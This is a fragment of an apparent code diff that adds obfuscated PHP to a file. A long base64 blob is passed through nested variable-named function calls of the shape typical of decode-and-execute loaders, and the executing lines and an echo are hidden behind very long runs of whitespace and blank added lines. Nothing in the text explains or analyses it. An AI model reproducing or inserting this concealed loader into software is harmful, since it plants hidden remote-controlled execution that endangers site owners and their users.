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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
